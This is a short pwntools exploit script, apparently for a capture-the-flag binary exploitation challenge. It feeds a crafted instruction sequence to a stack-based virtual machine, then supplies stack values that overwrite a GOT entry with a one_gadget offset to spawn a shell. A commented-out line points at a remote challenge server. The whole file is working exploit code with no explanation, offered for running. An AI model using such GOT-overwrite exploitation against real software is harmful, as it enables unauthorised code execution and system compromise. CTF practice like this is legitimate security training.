from pwn import *

context.log_level = 'debug'
r = process("./pwn")
#r = remote("a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com", "40003")

r.recvuntil("Your program name:\n")
r.sendline("/bin/sh")

r.recvuntil("Your instruction:\n")
payload = "push push push load push sub div sub load push add"
payload += " push push push load push sub div sub save"
#payload = "push push push load push sub div sub load pop"
r.sendline(payload)

gdb.attach(r)

r.recvuntil("Your stack data:\n")
#payload = "-1 8 -5 4210720"
payload = "-1 8 -5 4210720 -172800 -1 8 -6 4210720"
#0x404020 = 4210720,offset = -172800,one_gadget = -173178
r.sendline(payload)

#print r.recv()

r.interactive()

